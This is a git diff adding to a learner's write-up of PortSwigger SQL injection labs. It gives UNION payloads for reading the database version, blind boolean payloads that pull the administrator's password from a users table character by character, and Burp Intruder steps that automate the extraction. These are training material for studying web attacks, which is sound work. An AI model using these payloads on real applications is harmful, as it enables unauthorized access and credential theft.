@@ -141,7 +141,7 @@ I'm going to first determine te number of columns available using the `UNION` me
 
 There are 2 columns since when I add a third column I get an internal server error.
 
-Next up, confirm if the columns accept string values by using `'+UNION+select+'a',+NULL--`. This runs successfully hence first column accepts string values, next confirm the second column together with the first one using `'+UNION+select+'a',+'a--'`
+Next up, confirm if the columns accept string values by using `'+UNION+select+'a',+NULL--`. This runs successfully hence first column accepts string values, next confirm the second column together with the first one using `'+UNION+select+'a',+'a'--`
 
 ![](images/sqli/lab3b.png)
 ![](images/sqli/lab3c.png)
@@ -192,14 +192,10 @@ To identify how to concatenate, check the SQL version being run by using the fol
 
 | SQL Version | SQL Query method | String Concatenation 
 -------|-------------------------------|----------------
-Oracle | SELECT banner FROM v$version		| 'foo'||'bar' 
-			 | SELECT version FROM v$instance	|
--------|--------------------------------|-----------------
 Microsoft | SELECT @@version | 'foo'+'bar'
-----------|----------------------------- | ----------------
 PostgreSQL | SELECT version() | 'foo'||'bar'
------------|----------------------------|------------------
-MySQL | SELECT @@version | 'foo' 'bar' or CONCAT('foo','bar')
+MySQL | SELECT @@version | 'foo' 'bar' **or** CONCAT('foo','bar')
+Oracle | SELECT banner FROM v$version **or** SELECT version FROM v$instance  | 'foo'||'bar' 
 
 The version is PostgreSQL 11.12 as seen hence will use the PostgreSQL concatenation method.
 ![](images/sqli/lab4d.png)
@@ -212,6 +208,22 @@ From running this I get the usernames and passwords but the requirement is to lo
 
 ### **Lab 5: SQL injection attack, querying the database type and version on Oracle**
 
+This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string. 
+
+> **Solution**
+
+![](images/sqli/lab5.png)
+
+First off I'll determine the number of columns by using the `' ORDER BY 1--` till I get an internal server error which signifies that there are no more columns present.
+
+![](images/sqli/lab5a.png)
+
+Being an oracle database, I'll use `'+UNION+SELECT+banner,+NULL+FROM+v$version--` and it gives me the database type and version
+
+![](images/sqli/lab5b.png)
+
 ### **Lab 6: SQL injection attack, querying the database type and version on MySQL and Microsoft**
 
 ### **Lab 7: SQL injection attack, listing the database contents on non-Oracle databases**
@@ -220,7 +232,85 @@ From running this I get the usernames and passwords but the requirement is to lo
 
 ### **Lab 9: Blind SQL injection with conditional responses**
 
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+> **Solution**
+
+![](images/sqli/lab9.png)
+
+Once in the page and the tracking id is set, one recieves a `welcome back` message.
+![](images/sqli/lab9a.png)
+
+When the tracking id is changed to an incorrect tracking id, there is `no welcome back` message that is displayed.
+![](images/sqli/lab9b.png)
+```
+select tracking-id from tracking-table where TrackingId=MaUxWApi7iKDxf20' and 1=1--
+```
+If this is true then the welcome back message will be displayed, if false as in the case where we change to `1=0--` or `1=2--` then the welcome back message will not be displayed.
+
+I can confirm whether there is a users table present by using;
+```
+TrackingId=MaUxWApi7iKDxf20' and (select 'x' from users LIMIT 1)='x'--
+```
+
+This returns a welcome back message verifying that the there is a users table.
+![](images/sqli/lab9c.png)
+
+Next confirm that the administrator username exists in the users table using a similar method as above. `TrackingId=MaUxWApi7iKDxf20' and (select username from users where username='administrator')='administrator'--`
+![](images/sqli/lab9d.png)
+
+This brings a successful welcome back message hence is present.
+
+Next up, finding the password for the administrator user and identifying the length of the password by using
+`TrackingId=MaUxWApi7iKDxf20' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--`
+
+The password length will be increased until no welcome back message is received. Alternatively this can also be done by sending the page to intruder in burp.
+```
+- Send the page to Intruder
+- Clear all the positions that have been set then add the length position.
+- The attack type will be sniper.
+- Go to the Payloads tab and set the payload type as Numbers and payload options as Sequential from 1 to 30 and step to 1
+- Start the attack
+```
+![](images/sqli/lab9e.png)
+![](images/sqli/lab9f.png)
+
+From the attack, the password has exactly 20 characters since only those have the same length as from the rest.
+![](images/sqli/lab9g.png)
+
+Next is using burp Intruder to find the characters of the password from the 1st character to the 20th character.
+
+I can use the following method substring to find the first character of the password
+`TrackingId=MaUxWApi7iKDxf20' and (select substring(password,1,1) from users where username='administrator')='a'--`
+
+![](images/sqli/lab9h.png)
+
+The first charachter is **d**, having to go through the passwords one by one till the 20th character manually can be tidious hence I used a cluster bomb attack and set the positions at set positions and the payload set 1 would be numbers from 1 to 20 and payload set 2 would be bruteforcer then start the attack.
+
+![](images/sqli/lab9i.png)
+![](images/sqli/lab9j.png)
+
 ### **Lab 10: Blind SQL injection with conditional errors**
+
+[https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+> **Solution**
+![](images/sqli/lab10.png)
+
 
 ### **Lab 11: Blind SQL injection with time delays**
 
